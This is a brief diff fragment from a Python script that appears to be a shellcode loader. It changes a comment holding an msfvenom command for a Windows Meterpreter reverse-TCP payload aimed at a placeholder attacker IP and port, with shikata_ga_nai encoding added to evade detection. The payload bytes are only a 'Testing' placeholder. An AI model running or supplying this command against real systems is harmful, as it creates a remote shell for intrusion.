@@ -12,7 +12,7 @@ if __name__ == "__main__":
 
    args = parser.parse_args()
    
-   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[port] -f python
+   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] EXITFUNC=thread -f python –e x86/shikata_ga_nai
    payload = bytearray(
       "Testing"
    , "utf-8")
